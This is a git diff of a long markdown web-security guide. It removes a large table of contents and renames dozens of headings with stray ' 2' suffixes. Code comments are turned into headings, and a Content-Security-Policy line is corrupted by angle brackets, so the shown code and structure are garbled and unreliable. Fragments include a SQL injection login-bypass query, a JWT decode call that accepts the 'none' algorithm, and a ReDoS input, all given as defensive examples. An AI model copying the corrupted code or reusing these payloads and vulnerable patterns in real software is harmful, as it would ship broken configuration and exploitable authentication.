-  - [Data](#data)
-  - [Compliance](#compliance)
-- [THREAT DETECTION DEEP ATLAS](#threat-detection-deep-atlas)
-  - [Each keyword = expandable capability](#each-keyword-expandable-capability)
-  - [SIEM](#siem)
-  - [EDR/XDR](#edrxdr)
-  - [Threat Intelligence](#threat-intelligence)
-    - [END OF MEGA SECURITY EXPANSION](#end-of-mega-security-expansion)
-- [ACCESS DEEP ATLAS](#access-deep-atlas)
-  - [Each keyword = expandable implementation](#each-keyword-expandable-implementation-4)
-  - [Authentication](#authentication-2)
-  - [OAuth 2.0 / OIDC](#oauth-20-oidc-2)
-  - [Identity Providers](#identity-providers)
-  - [Session Management](#session-management)
-- [NETWORK SECURITY DEEP ATLAS](#network-security-deep-atlas)
-  - [Each keyword = expandable control](#each-keyword-expandable-control)
-  - [Perimeter Security](#perimeter-security)
-  - [Zero Trust](#zero-trust)
-  - [Encryption in Transit](#encryption-in-transit)
-  - [VPN & Remote Access](#vpn-remote-access)
-- [INCIDENT RESPONSE DEEP ATLAS](#incident-response-deep-atlas)
-  - [Each keyword = expandable process](#each-keyword-expandable-process)
-  - [Preparation](#preparation)
-  - [Detection & Analysis](#detection-analysis)
-  - [Containment](#containment)
-  - [Recovery & Lessons](#recovery-lessons)
-- [COMPLIANCE DEEP ATLAS](#compliance-deep-atlas)
-  - [Each keyword = expandable framework](#each-keyword-expandable-framework)
-  - [SOC 2](#soc-2)
-  - [ISO 27001](#iso-27001)
-  - [GDPR](#gdpr)
-  - [Industry-Specific](#industry-specific)
-- [SECURE SDLC DEEP ATLAS](#secure-sdlc-deep-atlas)
-  - [Each keyword = expandable practice](#each-keyword-expandable-practice)
-  - [Shift Left](#shift-left)
-  - [Build Security](#build-security)
-  - [Deploy Security](#deploy-security)
-  - [Runtime Security](#runtime-security)
-    - [END OF ULTRA SECURITY EXPANSION](#end-of-ultra-security-expansion)
-    - [Continuing expansion in next iteration](#continuing-expansion-in-next-iteration)
-- [SECURITY CODE EXAMPLES](#security-code-examples)
-- [INPUT VALIDATION](#input-validation-2)
-  - [Sanitization Middleware](#sanitization-middleware)
-- [CSRF PROTECTION](#csrf-protection)
-  - [Token-based CSRF](#token-based-csrf)
-- [ENCRYPTION](#encryption)
-  - [Data Encryption at Rest](#data-encryption-at-rest)
-- [API KEY MANAGEMENT](#api-key-management)
-  - [Secure API Key Generation](#secure-api-key-generation)
-- [SECURITY HEADERS](#security-headers-3)
-  - [Helmet Configuration](#helmet-configuration)
-    - [CONTINUED: MORE SECURITY PATTERNS](#continued-more-security-patterns)
-- [DEFENSE](#defense)
-- [JWT VULNERABILITIES DEEP DIVE](#jwt-vulnerabilities-deep-dive)
-  - [Production JWT Attack Patterns](#production-jwt-attack-patterns)
-- [SQL INJECTION BEYOND BASICS](#sql-injection-beyond-basics)
-  - [Second-Order & Blind SQL Injection](#second-order-blind-sql-injection)
-- [RATE LIMITING BYPASS TECHNIQUES](#rate-limiting-bypass-techniques)
-  - [Production Rate Limit Evasion](#production-rate-limit-evasion)
-    - [[SECURITY RESEARCHER LEVEL] CONTINUED: MORE PATTERNS](#security-researcher-level-continued-more-patterns)
-    - [Density: OWASP/Bug Bounty research quality](#density-owaspbug-bounty-research-quality)
-- [?? SECURITY - PENETRATION TESTING](#-security---penetration-testing)
-- [Pen Test Phases](#pen-test-phases)
-- [Common Findings](#common-findings)
-- [Bug Bounty Scope](#bug-bounty-scope)
-- [?? INCIDENT RESPONSE PLAYBOOK](#-incident-response-playbook)
-- [Incident Classification](#incident-classification)
-- [Response Steps](#response-steps)
-- [Evidence Preservation](#evidence-preservation)
-- [?? SECRETS ROTATION](#-secrets-rotation)
-- [Rotation Strategy](#rotation-strategy)
-- [AWS Secrets Manager](#aws-secrets-manager)
-- [Database Password Rotation](#database-password-rotation)
-- [?? AUTHENTICATION PATTERNS](#-authentication-patterns)
-- [Stateless JWT Flow](#stateless-jwt-flow)
-- [Refresh Token Pattern](#refresh-token-pattern)
-- [Token Revocation](#token-revocation)
-- [?? SECURITY LOGGING](#-security-logging)
-- [What to Log](#what-to-log)
-- [Log Format](#log-format-3)
-- [Alerting Thresholds](#alerting-thresholds)
-- [?? INPUT VALIDATION PATTERNS](#-input-validation-patterns)
-- [Zod Schema Validation](#zod-schema-validation)
-- [Express Middleware](#express-middleware)
-- [Sanitization](#sanitization-1)
-- [?? SECURE SESSION MANAGEMENT](#-secure-session-management)
-- [Session ID Generation](#session-id-generation)
-- [Cookie Settings](#cookie-settings)
-- [Session Fixation Prevention](#session-fixation-prevention)
-- [Idle Timeout](#idle-timeout)
-- [?? SECURITY HEADERS DEEP DIVE](#-security-headers-deep-dive)
-- [Strict-Transport-Security](#strict-transport-security)
-- [Content-Security-Policy](#content-security-policy)
-- [X-Frame-Options](#x-frame-options)
-- [Permissions-Policy](#permissions-policy)
-- [?? PASSWORD SECURITY](#-password-security)
-- [Hashing Algorithm Choice](#hashing-algorithm-choice)
-- [Implementation](#implementation-1)
-- [Password Policy](#password-policy)
-- [?? API AUTHENTICATION PATTERNS](#-api-authentication-patterns)
-- [API Key vs JWT vs OAuth](#api-key-vs-jwt-vs-oauth)
-- [API Key Best Practices](#api-key-best-practices)
-- [JWT for APIs](#jwt-for-apis)
-- [Scope-Based Authorization](#scope-based-authorization)
-- [?? RBAC IMPLEMENTATION](#-rbac-implementation)
-- [Database Schema](#database-schema)
-- [Permission Check](#permission-check)
-- [Middleware](#middleware)
-- [?? MFA IMPLEMENTATION](#-mfa-implementation)
-- [TOTP (Time-based One-Time Password)](#totp-time-based-one-time-password)
-- [Backup Codes](#backup-codes)
-- [Recovery Flow](#recovery-flow)
-- [?? SECURITY SCANNING](#-security-scanning)
-- [Static Analysis](#static-analysis)
-- [Dependency Scanning](#dependency-scanning)
-- [Container Scanning](#container-scanning)
-- [SAST in CI](#sast-in-ci)
-- [?? ACCOUNT SECURITY PATTERNS](#-account-security-patterns)
-- [Login Attempt Tracking](#login-attempt-tracking)
-- [Suspicious Activity Detection](#suspicious-activity-detection)
-- [Session Security](#session-security-3)
-- [?? OAUTH 2.0 DEEP DIVE](#-oauth-20-deep-dive)
-- [PKCE Flow (for SPAs and Mobile)](#pkce-flow-for-spas-and-mobile)
-- [Token Storage](#token-storage-3)
-- [Silent Refresh](#silent-refresh)
-- [JWT SECURITY PATTERNS](#jwt-security-patterns)
-- [Token Structure](#token-structure)
-- [Access + Refresh Tokens](#access-refresh-tokens)
-- [Security Checklist](#security-checklist)
-- [AUTHENTICATION FLOW PATTERNS](#authentication-flow-patterns)
-- [OAuth 2.0 with PKCE (SPA/Mobile)](#oauth-20-with-pkce-spamobile)
-- [Session vs Token Comparison](#session-vs-token-comparison)
-- [XSS PREVENTION](#xss-prevention)
-- [Types of XSS](#types-of-xss)
-- [Prevention (React)](#prevention-react)
-- [Prevention (Backend)](#prevention-backend)
-- [ENVIRONMENT VARIABLES](#environment-variables-2)
-- [Environment Setup](#environment-setup)
-- [Validation with Zod](#validation-with-zod)
-- [Security Rules](#security-rules-3)
-- [CSRF PROTECTION](#csrf-protection)
-- [What is CSRF?](#what-is-csrf)
-- [Prevention: Token Pattern](#prevention-token-pattern)
-- [For SPAs: Double Submit Cookie](#for-spas-double-submit-cookie)
-- [COOKIE SECURITY](#cookie-security-2)
-- [Secure Cookie Settings](#secure-cookie-settings)
-- [SameSite Explained](#samesite-explained)
-- [Cookie vs localStorage](#cookie-vs-localstorage)
-- [PATTERNS](#patterns)
-- [Setup](#setup)
-- [Route Protection](#route-protection)
-- [Server Component](#server-component)
-- [Client Component](#client-component)
-- [VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories)](#volume-7-security-production-incidents-real-company-stories)
-  - [1. SQL INJECTION - DATA BREACH](#1-sql-injection---data-breach)
-    - [Production Incident from Sony (18,500+ upvotes)](#production-incident-from-sony-18500-upvotes)
-- [2. PASSWORD BREACH - $1.4 BILLION](#2-password-breach---14-billion)
-  - [Production Incident from Equifax (LEGENDARY)](#production-incident-from-equifax-legendary)
-- [3. JWT SECRET EXPOSED](#3-jwt-secret-exposed)
-  - [Production Incident from Twitch (9,800+ upvotes)](#production-incident-from-twitch-9800-upvotes)
-  - [4. LOG4SHELL - WORST EVER (10/10)](#4-log4shell---worst-ever-1010)
-    - [Production Incident from Worldwide](#production-incident-from-worldwide)
-- [5. API KEY LEAKED - $50K BILL](#5-api-key-leaked---50k-bill)
-  - [Production Incident from Heroku (7,400+ upvotes)](#production-incident-from-heroku-7400-upvotes)
-- [6. SSRF - INTERNAL ACCESS](#6-ssrf---internal-access)
-  - [Production Incident from Slack (8,200+ upvotes)](#production-incident-from-slack-8200-upvotes)
-- [END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS](#end-of-volume-7-security-production-incidents)
-- [VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL](#volume-11-titan-protocol---security-adversarial)
-  - [JWT NONE ALGORITHM VULNERABILITY](#jwt-none-algorithm-vulnerability)
-    - [Auth Bypass Scar](#auth-bypass-scar)
-  - [ReDoS (REGEX DENIAL OF SERVICE)](#redos-regex-denial-of-service)
-    - [Event Loop Freeze Scar](#event-loop-freeze-scar)
-    - [END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL](#end-of-volume-11-titan-security-adversarial)
-- [VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE](#volume-12-titan-protocol---adversarial-architecture)
-  - [CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626)](#container-escapes-leaky-vessels-cve-2024-21626)
-    - [runc Vulnerability Scar](#runc-vulnerability-scar)
-  - [eBPF EXPLOITATION](#ebpf-exploitation)
-    - [Kernel Attack Surface Scar](#kernel-attack-surface-scar)
-  - [SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY](#side-channel-attacks-timing-in-cryptography)
-    - [String Comparison Timing Attack](#string-comparison-timing-attack)
-  - [HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL](#homomorphic-encryption-the-holy-grail)
-    - [FHE Status 2024](#fhe-status-2024)
-    - [END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY](#end-of-volume-12-titan-adversarial-security)
-- [VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES](#volume-13-titan-catalog---30-security-failures)
-  - [END OF VOLUME 1.3: TITAN SECURITY CATALOG](#end-of-volume-13-titan-security-catalog)
-- [VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS](#volume-14-titan-vault---additional-security-scars)
-  - [IAM PASSROLE PRIVILEGE ESCALATION](#iam-passrole-privilege-escalation)
-    - [AWS Privilege Escalation Scar](#aws-privilege-escalation-scar)
-  - [S3 NOTPRINCIPAL ANTI-PATTERN](#s3-notprincipal-anti-pattern)
-    - [Data Exfiltration Vector](#data-exfiltration-vector)
-    - [END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS](#end-of-volume-14-additional-security-scars)
-- [VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS](#volume-15-titan-vault---supply-chain-identity-attacks)
-  - [JWT ALGORITHM CONFUSION ATTACK](#jwt-algorithm-confusion-attack)
-    - [RS256 to HS256 Downgrade Scar](#rs256-to-hs256-downgrade-scar)
-- [Additional JWT Pitfalls](#additional-jwt-pitfalls)
-  - [OPENID CONNECT VULNERABILITIES](#openid-connect-vulnerabilities)
-    - [OIDC State Fixation Scar](#oidc-state-fixation-scar)
-  - [DEPENDENCY CONFUSION ATTACK](#dependency-confusion-attack)
-    - [Private Package Hijacking Scar](#private-package-hijacking-scar)
-- [CSP BYPASS TECHNIQUES](#csp-bypass-techniques)
-  - [Content Security Policy Evasion](#content-security-policy-evasion)
-- [TIMING ATTACKS AGAINST STRING COMPARISON](#timing-attacks-against-string-comparison)
-  - [The Scar](#the-scar)
-- [UNICODE NORMALIZATION ATTACKS](#unicode-normalization-attacks)
-  - [The Scar](#the-scar-3)
-- [END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS](#end-of-volume-17-titan-gemini-research---advanced-attack-patterns)
-- [VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION](#volume-2-titan-gemini-research---auth-and-secrets-production)
-  - [JWT SECURITY PITFALLS](#jwt-security-pitfalls)
-    - [The Scar](#the-scar-2)
-- [API KEY ROTATION](#api-key-rotation)
-  - [The Scar](#the-scar-3)
-
-## ?? ADVANCED SECURITY PATTERNS
+## ?? ADVANCED SECURITY PATTERNS 2
 
 > **The patterns that protect applications**
 
 ---
 
-## ?? AUTHENTICATION DEEP DIVE
+## ?? AUTHENTICATION DEEP DIVE 2
 
 > **The patterns for secure auth**
 
 ---
 
-## ?? INPUT VALIDATION
+## ?? INPUT VALIDATION 2
 
 > **The patterns for secure data handling**
 
 ---
 
-## ?? CORS EXPLAINED
+## ?? CORS EXPLAINED 2
 
 > **The patterns for cross-origin requests**
 
 ---
 
-## ?? ENCRYPTION PATTERNS
+## ?? ENCRYPTION PATTERNS 2
 
 > **The patterns for protecting data**
 
 ---
 
-## ?? API SECURITY CHECKLIST
+## ?? API SECURITY CHECKLIST 2
 
 > **The patterns for secure APIs**
 
 ---
 
-## ?? ZERO TRUST SECURITY
+## ?? ZERO TRUST SECURITY 2
 
 > **The patterns for modern security**
 
 ---
 
-## ?? CONTENT SECURITY POLICY
+## ?? CONTENT SECURITY POLICY 2
 
 > **The patterns for XSS prevention**
 
 ---
 
-## ?? API KEY PATTERNS
+## ?? API KEY PATTERNS 2
 
 > **The secure API key implementation**
 
 ---
 
-## ?? OAUTH 2.0 FLOWS
+## ?? OAUTH 2.0 FLOWS 2
 
 > **The correct OAuth implementation**
 
 ---
 
-## ?? SUBDOMAIN TAKEOVER PREVENTION
+## ?? SUBDOMAIN TAKEOVER PREVENTION 2
 
 > **The DNS security patterns**
 
 ---
 
-## ?? RATE LIMIT BYPASS PREVENTION
+## ?? RATE LIMIT BYPASS PREVENTION 2
 
 > **The security patterns for rate limiting**
 
 ---
 
-## ?? SECURE FILE UPLOAD
+## ?? SECURE FILE UPLOAD 2
 
 > **The patterns for safe file handling**
 
 ---
 
-## ?? DEPENDENCY SCANNING
+## ?? DEPENDENCY SCANNING 2
 
 > **The patterns for secure dependencies**
 
 ---
 
-## ?? CSRF PREVENTION PATTERNS
+## ?? CSRF PREVENTION PATTERNS 2
 
 > **The cross-site request forgery protection**
 
 ---
 
-## ?? XSS PREVENTION PATTERNS
+## ?? XSS PREVENTION PATTERNS 2
 
 > **The cross-site scripting protection**
 
 ---
 
-## ?? SECURE HEADERS CONFIGURATION
+## ?? SECURE HEADERS CONFIGURATION 2
 
 > **The HTTP security headers**
 
 ---
 
-## AUTHENTICATION
+## AUTHENTICATION 2 2
 
 - Password hashing: bcrypt, scrypt, Argon2id
 
@@ -13484,7 +13593,7 @@ value: "2024-01-01T00:00:00Z"
 
 - Passkeys: credential manager, cross-device
 
-## AUTHORIZATION
+## AUTHORIZATION 2 2
 
 - RBAC: roles, permissions, inheritance
 
@@ -13498,7 +13607,7 @@ value: "2024-01-01T00:00:00Z"
 
 - Zero trust: never trust, always verify
 
-## INPUT VALIDATION
+## INPUT VALIDATION 3 2
 
 ```typescript
 
@@ -13534,163 +13643,163 @@ return res.json(user);
 // For file uploads
 const fileSchema = z.object({
 mimetype: z.enum(['image/jpeg', 'image/png', 'image/webp']),
-size: z.number().max(5 * 1024 * 1024),  // 5MB max
+size: z.number().max(5 *1024* 1024),  // 5MB max
 });
 
 ```text
 
 ---
 
-## SECURITY HEADERS
+## SECURITY HEADERS 2 2
 
-## ?? SECURITY - PENETRATION TESTING
+## ?? SECURITY - PENETRATION TESTING 2
 
 > **The offensive security patterns**
 
 ---
 
-## ?? INCIDENT RESPONSE PLAYBOOK
+## ?? INCIDENT RESPONSE PLAYBOOK 2
 
 > **The security incident handling**
 
 ---
 
-## ?? SECRETS ROTATION
+## ?? SECRETS ROTATION 2
 
 > **The credential lifecycle patterns**
 
 ---
 
-## ?? AUTHENTICATION PATTERNS
+## ?? AUTHENTICATION PATTERNS 2
 
 > **The auth implementation patterns**
 
 ---
 
-## ?? SECURITY LOGGING
+## ?? SECURITY LOGGING 2
 
 > **The audit and security event patterns**
 
 ---
 
-## ?? INPUT VALIDATION PATTERNS
+## ?? INPUT VALIDATION PATTERNS 2
 
 > **The data sanitization patterns**
 
 ---
 
-## ?? SECURE SESSION MANAGEMENT
+## ?? SECURE SESSION MANAGEMENT 2
 
 > **The session security patterns**
 
 ---
 
-## ?? SECURITY HEADERS DEEP DIVE
+## ?? SECURITY HEADERS DEEP DIVE 2
 
 > **The essential HTTP security headers**
 
 ---
 
-## ?? PASSWORD SECURITY
+## ?? PASSWORD SECURITY 2
 
 > **The authentication security patterns**
 
 ---
 
-## ?? API AUTHENTICATION PATTERNS
+## ?? API AUTHENTICATION PATTERNS 2
 
 > **The secure API access patterns**
 
 ---
 
-## ?? RBAC IMPLEMENTATION
+## ?? RBAC IMPLEMENTATION 2
 
 > **Role-Based Access Control patterns**
 
 ---
 
-## ?? MFA IMPLEMENTATION
+## ?? MFA IMPLEMENTATION 2
 
 > **Multi-factor authentication patterns**
 
 ---
 
-## ?? SECURITY SCANNING
+## ?? SECURITY SCANNING 2
 
 > **The automated vulnerability detection**
 
 ---
 
-## Dependency Scanning
+## Dependency Scanning 3 2
 
 ```bash
 
-## ?? ACCOUNT SECURITY PATTERNS
+## ?? ACCOUNT SECURITY PATTERNS 2
 
 > **The user account protection patterns**
 
 ---
 
-## ?? OAUTH 2.0 DEEP DIVE
+## ?? OAUTH 2.0 DEEP DIVE 2
 
 > **The authorization patterns**
 
 ---
 
-## ENVIRONMENT VARIABLES
+## ENVIRONMENT VARIABLES 2 2
 
 > **The secrets management patterns**
 
 ---
 
-## COOKIE SECURITY
+## COOKIE SECURITY 2 2
 
 > **The session patterns that don't get hacked**
 
 ---
 
-## Query: SELECT * FROM users WHERE email = 'admin'--'
+## Query: SELECT * FROM users WHERE email = 'admin'--' 2
 
-## Password check bypassed!
+## Password check bypassed 2 2
 
-## Log4j downloads and executes attacker's code!
+## Log4j downloads and executes attacker's code 2 2
 
-## VULNERABLE: algorithms not specified!
+## VULNERABLE: algorithms not specified 2 2
 
 payload = jwt.decode(token, secret_key)  # Accepts 'none'!
 return payload
 
-## 3. Server verifies with same "secret" = valid signature!
+## 3. Server verifies with same "secret" = valid signature 2 2
 
-## Attacker can detect the difference!
+## Attacker can detect the difference 2 2
 
-## TITAN: Constant-time comparison
+## TITAN: Constant-time comparison 2 2
 
 import hmac
 import secrets
 
 def verify_api_key(provided_key: str, stored_key: str) -> bool:
 
-## With input: 'a' * 30 + '!'
+## With input: 'a' * 30 + '!' 2
 
-## Converts l, a, III, etc.
+## Converts l, a, III, etc 2 2
 
 normalized = unicodedata.normalize('NFKC', username)
 
-## Don't use .lower() for security comparisons!
+## Don't use .lower() for security comparisons 2 2
 
 import icu  # PyICU
 return icu.UnicodeString(text).toLower(icu.Locale(locale))
 
 ```text
 
-## ? WRONG: [...nextAuth].ts (capital A)
+## ? WRONG: [...nextAuth].ts (capital A) 2
 
-## ? CORRECT: [...nextauth].ts (lowercase)
+## ? CORRECT: [...nextauth].ts (lowercase) 2
 
-## Git might not track case-only changes!
+## Git might not track case-only changes 2
 
-## SQL Injection Prevention
+## SQL Injection Prevention 3
 
 ```typescript
 
@@ -13716,7 +13825,7 @@ const validatedId = userIdSchema.parse(userId);
 
 ---
 
-## XSS Prevention
+## XSS Prevention 3 2
 
 ```typescript
 
@@ -13754,7 +13863,7 @@ script-src 'self' 'unsafe-eval' 'unsafe-inline';
 style-src 'self' 'unsafe-inline';
 img-src 'self' blob: data:;
 font-src 'self';
-connect-src 'self' https://api.example.com;
+connect-src 'self' <https://api.example.com;>
 `.replace(/\s+/g, ' ').trim()
   }
 ];
@@ -13763,7 +13872,7 @@ connect-src 'self' https://api.example.com;
 
 ---
 
-## CSRF Protection
+## CSRF Protection 2 2
 
 ```typescript
 
@@ -13820,4 +13929,4 @@ return res.status(403).json({ error: 'Invalid CSRF token' });
 
 ---
 
-```
+```text
